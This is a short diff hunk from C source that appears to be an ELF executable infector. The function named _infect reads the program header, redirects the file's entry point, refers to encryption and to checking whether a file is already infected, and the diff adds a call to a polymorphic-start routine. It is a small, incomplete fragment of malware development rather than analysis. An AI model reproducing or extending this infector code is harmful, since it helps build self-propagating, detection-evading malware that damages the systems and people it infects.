@@ -134,6 +134,7 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 	ph = (*(void**)s) + h->e_phoff;
 	//TODO: check not already inf
 	//ph[x].p_memsz += changed;
+	poly_new_start((*s) + pos);//TODO
 	update((*s) + pos, p.bn, old_entry, h->e_entry, opt, *s, *n, compressed, p);
 
 	//---------- z2 (encryption without compression) -------------
